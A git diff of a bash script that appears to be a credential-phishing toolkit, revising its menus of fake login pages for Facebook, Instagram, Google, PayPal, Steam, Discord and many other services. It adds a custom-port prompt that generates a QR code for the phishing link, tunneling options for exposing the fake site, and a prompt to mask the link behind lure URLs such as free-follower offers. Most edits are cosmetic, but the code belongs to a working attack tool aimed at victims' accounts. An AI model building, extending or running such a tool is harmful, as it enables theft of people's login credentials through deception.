@@ -163,19 +163,29 @@ dependencies() {
 
 }
 
-install_qrencode() {
-    if ! command -v qrencode &> /dev/null; then
-        echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} qrencode not found, installing..."${WHITE}
-        if [[ -x "$(command -v apt-get)" ]]; then
-            sudo apt-get install qrencode -y
-        elif [[ -x "$(command -v yum)" ]]; then
-            sudo yum install qrencode -y
-        elif [[ -x "$(command -v dnf)" ]]; then
-            sudo dnf install qrencode -y
+cusport() {
+    echo
+    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} To Create Your Own Custom Port: ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+    echo
+    if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+        read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+        echo
+        if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^[0-9]{4}$ && ${CU_P} -ge 1024 && ${CU_P} -le 9999 ]]; then
+            PORT=${CU_P}
+            echo -ne "${GREEN}[${WHITE}+${GREEN}]${WHITE} Custom Port Set To: $PORT\n"
+            # Call QR code generation function here with $PORT if needed
+            generate_qr_code $PORT
         else
-            echo -e "${RED}[${WHITE}!${RED}]${RED} Package manager not supported. Please install qrencode manually."${WHITE}
-            exit 1
+            echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+            sleep 2
+            clear
+            banner_small
+            cusport
         fi
+    else
+        echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Set Default Port $PORT...${WHITE}\n"
+        # Call QR code generation function here with $PORT if needed
+        generate_qr_code $PORT
     fi
 }
 
@@ -423,13 +433,13 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
-		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}01${RED}]${RED} Localhost
+		${RED}[${WHITE}02${RED}]${RED} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+		${RED}[${WHITE}03${RED}]${RED} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${YELLOW} Select a port forwarding service : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -447,14 +457,14 @@ tunnel_menu() {
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to Hide Your URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+			echo -e "\n${RED}[${WHITE}-${RED}]${RED} Using Mask Url :${GREEN} $mask"
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
 		fi
@@ -521,7 +531,7 @@ custom_url() {
 site_facebook()  {
     cat <<- EOF
         ${RED}[${WHITE}01${RED}]${ORANGE} Facebook Login Page
-        ${RED}[${WHITE}02${RED}]${ORANGE} Advanced Facebook Page
+        ${RED}[${WHITE}02${RED}]${ORANGE} Advance Facebook Page
         ${RED}[${WHITE}03${RED}]${ORANGE} Facebook Security Page
         ${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Page
 EOF
@@ -566,7 +576,7 @@ site_instagram() {
         ${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
 EOF
 
-    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" option
+    read -p "${RED}[${WHITE}-${RED}]${RED} Select an option : ${YELLOW}" option
 
     case $option in 
         1 | 01)
@@ -600,7 +610,7 @@ site_gmail() {
         ${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
 EOF
 
-    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" option
+    read -p "${RED}[${WHITE}-${RED}]${RED} Select an option : ${YELLOW}" option
 
     case $option in 
         1 | 01)
@@ -629,7 +639,7 @@ site_vk() {
         ${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
 EOF
 
-    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" option
+    read -p "${RED}[${WHITE}-${RED}]${RED} Select an option : ${YELLOW}" option
 
     case $option in 
         1 | 01)
@@ -655,38 +665,40 @@ main_menu() {
     echo
     while true; do
     cat <<- EOF
-        ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+    ${ORANGE}[${WHITE} Social Media ${ORANGE}]${RED}:
+        ${ORANGE}[${WHITE}01${ORANGE}]${RED} Facebook    ${ORANGE}[${WHITE}08${ORANGE}]${RED} Twitter      ${ORANGE}[${WHITE}14${ORANGE}]${RED} Linkedin 
+        ${ORANGE}[${WHITE}02${ORANGE}]${RED} Instagram   ${ORANGE}[${WHITE}09${ORANGE}]${RED} Playstation  ${ORANGE}[${WHITE}19${ORANGE}]${RED} Reddit 
+        ${ORANGE}[${WHITE}03${ORANGE}]${RED} Google      ${ORANGE}[${WHITE}10${ORANGE}]${RED} Tiktok       ${ORANGE}[${WHITE}34${ORANGE}]${RED} Discord 
 
-        ${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-        ${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-        ${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-        ${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox    
-        ${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo        
-        ${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-        ${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex            
-        ${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} Stackoverflow
-        ${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-        ${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-        ${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-        ${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox
+        ${ORANGE}[${WHITE} Services & Platforms ${ORANGE}]${RED}:
+        ${ORANGE}[${WHITE}04${ORANGE}]${RED} Microsoft   ${ORANGE}[${WHITE}11${ORANGE}]${RED} Twitch       ${ORANGE}[${WHITE}18${ORANGE}]${RED} Spotify  
+        ${ORANGE}[${WHITE}05${ORANGE}]${RED} Netflix     ${ORANGE}[${WHITE}12${ORANGE}]${RED} Pinterest    ${ORANGE}[${WHITE}20${ORANGE}]${RED} Adobe 
+        ${ORANGE}[${WHITE}06${ORANGE}]${RED} Paypal      ${ORANGE}[${WHITE}13${ORANGE}]${RED} Snapchat     ${ORANGE}[${WHITE}24${ORANGE}]${RED} Dropbox 
 
-        ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+        ${ORANGE}[${WHITE} Gaming & Development ${ORANGE}]${RED}:
+        ${ORANGE}[${WHITE}07${ORANGE}]${RED} Steam       ${ORANGE}[${WHITE}23${ORANGE}]${RED} Origin       ${ORANGE}[${WHITE}30${ORANGE}]${RED} XBOX 
+        ${ORANGE}[${WHITE}35${ORANGE}]${RED} Roblox      ${ORANGE}[${WHITE}32${ORANGE}]${RED} Gitlab       ${ORANGE}[${WHITE}33${ORANGE}]${RED} Github 
+
+        ${ORANGE}[${WHITE} Other Platforms ${ORANGE}]${RED}:
+        ${ORANGE}[${WHITE}21${ORANGE}]${RED} DeviantArt  ${ORANGE}[${WHITE}26${ORANGE}]${RED} Wordpress    ${ORANGE}[${WHITE}27${ORANGE}]${RED} Yandex 
+        ${ORANGE}[${WHITE}22${ORANGE}]${RED} Badoo       ${ORANGE}[${WHITE}28${ORANGE}]${RED} StackOverflow
+        ${ORANGE}[${WHITE}31${ORANGE}]${RED} Mediafire
+
+        ${ORANGE}[${WHITE}99${ORANGE}]${RED} About       ${ORANGE}[${WHITE}00${ORANGE}]${RED} Exit
+
 EOF
 
     read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" REPLY
 
     case $REPLY in 
         1 | 01)
-            website="facebook"
-            mask='https://blue-verified-badge-for-facebook-free'
+            site_facebook
             ;;
         2 | 02)
-            website="instagram"
-            mask='https://get-unlimited-followers-for-instagram'
+            site_instagram
             ;;
         3 | 03)
-            website="google"
-            mask='https://get-unlimited-google-drive-free'
+            site_gmail
             ;;
         4 | 04)
             website="microsoft"
@@ -770,7 +782,6 @@ EOF
             ;;
         29)
             site_vk  # Generate QR inside the VK function
-            return
             ;;
         30)
             website="xbox"
